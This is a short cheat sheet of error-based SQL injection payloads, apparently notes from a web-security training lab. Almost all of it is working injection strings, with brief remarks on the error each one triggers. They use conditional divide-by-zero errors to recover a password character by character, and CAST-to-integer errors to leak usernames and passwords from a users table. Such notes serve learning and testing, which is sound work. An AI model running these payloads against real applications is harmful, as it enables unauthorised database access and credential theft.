# Error-based SQLi

`' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`

`' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

### Example:
`'		error`

`''		no error`

`'||(SELECT '')||'			subquery`

`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

`'||(SELECT CASE WHEN SUBSTR(password,20,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

# Extract data via verbose SQL error
Consider the query:

`CAST((SELECT example_column FROM example_table) AS int)`

ERROR: invalid input syntax for type integer: "Example data"

### Example:
`xyz'`

Error -> `SELECT * FROM tracking WHERE id = 'PlSY7esyQmlU2B3t''`

`xyz'--`     ->  No error

`xyz' AND CAST((SELECT 1) AS int) --`		Error must be boolean

`xyz' AND 1=CAST((SELECT 1) AS int) --`  No error

`xyz' AND 1=CAST((SELECT username FROM users) AS int) --`		Appeared fist error, and truncated query

`' AND 1=CAST((SELECT username FROM users) AS int)--`				Without the variable value(xyz) to free characters, error more than one row returned by a subquery

`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int) --`	Get username

`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) --`	Get password
